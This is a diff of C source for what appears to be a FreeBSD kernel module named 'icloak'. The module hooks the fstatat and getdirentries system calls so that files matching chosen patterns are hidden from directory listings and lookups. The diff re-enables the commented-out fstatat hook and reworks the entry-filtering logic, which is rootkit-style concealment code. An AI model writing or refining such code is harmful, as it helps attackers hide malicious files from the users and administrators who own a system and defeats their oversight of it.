@@ -16,13 +16,13 @@ static struct linker_file *find_kld(const char *name);
 
 static struct module *find_mod(const char *name);
 
-static int icloak_fstatat(struct thread *td, struct fstatat_args *args);
+static int icloak_fstatat(struct thread *td, struct fstatat_args *uap);
 
-static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args);
+static int icloak_getdirentries(struct thread *td, struct getdirentries_args *uap);
 
-int (*fstatat_syscall)(struct thread *td, struct fstatat_args *args) = NULL;
+int (*fstatat_syscall)(struct thread *td, struct fstatat_args *uap) = NULL;
 
-int (*getdirentries_syscall)(struct thread *td, struct getdirentries_args *args) = NULL;
+int (*getdirentries_syscall)(struct thread *td, struct getdirentries_args *uap) = NULL;
 
 static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;
 
@@ -133,9 +133,9 @@ int native_hide_file(const char *pattern) {
         return 1;
     }
 
-    //if (fstatat_syscall == NULL) {
-    //    kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
-    //}
+    if (fstatat_syscall == NULL) {
+        kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
+    }
 
     if (getdirentries_syscall == NULL) {
         kook(SYS_getdirentries, icloak_getdirentries, (void **)&getdirentries_syscall);
@@ -163,6 +163,7 @@ int native_show_file(const char *pattern) {
             }
         }
 
+
         if (getdirentries_syscall != NULL) {
             if (kook(SYS_getdirentries, getdirentries_syscall, NULL) == 0) {
                 getdirentries_syscall = NULL;
@@ -173,28 +174,29 @@ int native_show_file(const char *pattern) {
     return 0;
 }
 
-static int icloak_fstatat(struct thread *td, struct fstatat_args *args) {
+static int icloak_fstatat(struct thread *td, struct fstatat_args *uap) {
     int matches;
 
-    matches = icloak_match_filename(args->path, g_icloak_hidden_patterns);
+    matches = icloak_match_filename(uap->path, g_icloak_hidden_patterns);
 
     if (matches) {
+        memset(uap, 0, sizeof(struct fstatat_args));
         td->td_retval[0] = ENOENT;
         return ENOENT;
     }
 
-    return fstatat_syscall(td, args);
+    return fstatat_syscall(td, uap);
 }
 
-static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args) {
-    int total, num, delta;
+static int icloak_getdirentries(struct thread *td, struct getdirentries_args *uap) {
+    int num, delta;
     struct dirent *dirp;
     void *buf, *bp;
 
-    getdirentries_syscall(td, args);
-    num = total = td->td_retval[0];
+    getdirentries_syscall(td, uap);
+    num = td->td_retval[0];
 
-    if (total <= 0) {
+    if (num <= 0) {
         return ENOENT;
     }
 
@@ -204,7 +206,7 @@ static int icloak_getdirentries(struct thread *td, struct getdirentries_args *ar
         return EFAULT;
     }
 
-    dirp = (struct dirent *)args->buf;
+    dirp = (struct dirent *)uap->buf;
     delta = 0;
     bp = buf;
 
@@ -221,9 +223,9 @@ static int icloak_getdirentries(struct thread *td, struct getdirentries_args *ar
     }
 
     if (delta > 0) {
-        memset(args->buf, 0, total);
-        total -= delta;
-        copyout(buf, args->buf, total);
+        memset(uap->buf, 0, td->td_retval[0]);
+        td->td_retval[0] -= delta;
+        copyout(buf, uap->buf, td->td_retval[0]);
     }
 
     icloak_free(buf);
